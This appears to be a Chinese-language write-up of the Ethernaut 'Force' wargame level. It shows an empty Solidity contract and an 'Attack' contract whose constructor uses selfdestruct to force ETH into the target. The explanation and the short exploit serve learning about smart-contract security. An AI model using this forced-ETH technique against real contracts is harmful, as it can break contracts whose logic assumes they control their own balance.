# Force
Force 對於不是非常熟悉solidity的同學來説是非常比較有難度的，這一關要求我們使目標合約的餘額大於0，我們先看代碼：

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
## 代码分析
代碼非常簡單，就是一個畫著可愛貓貓的備注，即一個空合約。正常情況下，如果我們想要讓一個合約的餘額增加我們首先會想到利用合約的`payable`函數或者是`fallback`函數來將ETH轉賬給合約地址。但是在現在這個情況，`Force`合約是一個空合約，并不能達成我們假設的那種的情況。這裏就需要利用一個叫做`selfdestruct`（自銷毀）的函數。

這裏是關於selfdestruct的官方文檔引用：
>The only way to remove code from the blockchain is when a contract at that address performs the `selfdestruct` operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state. Removing the contract in theory sounds like a good idea, but it is potentially dangerous, as if someone sends Ether to removed contracts, the Ether is forever lost.

`selfdestruct`可以將被銷毀的合約的剩餘ETH轉賬給指定的地址，然後將合約的代碼和存儲從狀態中刪除。我們可以利用ETH轉賬的這個特性，强行將ETH轉賬給我們的`Force`合約，即可完成這一關。

## 攻击代碼

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack {
  constructor (address payable _target) payable {
    selfdestruct(_target);
  }
}
```

## 攻击过程
1. 部署攻擊合約，`_target`為`Force`合約實例的地址，部署時記得需要傳入任意數量的的ETH
2. 完成任務
